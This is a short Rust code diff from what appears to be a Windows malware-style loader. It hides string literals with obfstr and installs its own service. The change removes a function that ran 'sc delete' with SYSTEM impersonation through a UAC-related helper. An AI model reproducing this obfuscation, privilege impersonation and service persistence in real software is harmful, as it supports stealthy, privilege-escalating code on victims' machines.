@@ -6,10 +6,7 @@ use loader_vars::constants::{
     loader_service_name,
 };
 use obfstr::obfstr as s;
-use shared::{
-    uac::impersonate_system::execute_file_as_system,
-    utils::functions::{ call_cmd, get_current_exe, system32_dir },
-};
+use shared::utils::functions::{ call_cmd, get_current_exe, system32_dir };
 use std::ffi::OsString;
 use windows_service::{
     service::{ ServiceAccess, ServiceErrorControl, ServiceInfo, ServiceStartType, ServiceType },
@@ -72,10 +69,10 @@ pub fn delete_service(service_name: &str) -> Result<Output> {
     let command = format!("{}{}{}", s!("sc delete "), service_name, s!("/force /noconfirm"));
     call_cmd(&command)
 }
-pub fn delete_system_service(service_name: &str) -> Result<()> {
-    let command = format!("{}{}{}", s!("sc delete "), service_name, s!("/force /noconfirm"));
-    execute_file_as_system(s!("sc"), Some(&command), false)
-}
+// pub fn delete_system_service(service_name: &str) -> Result<()> {
+//     let command = format!("{}{}{}", s!("sc delete "), service_name, s!("/force /noconfirm"));
+//     execute_file_as_system(s!("sc"), Some(&command), false)
+// }
 
 pub fn install_initial_service() -> Result<()> {
     let service_name = loader_service_name();
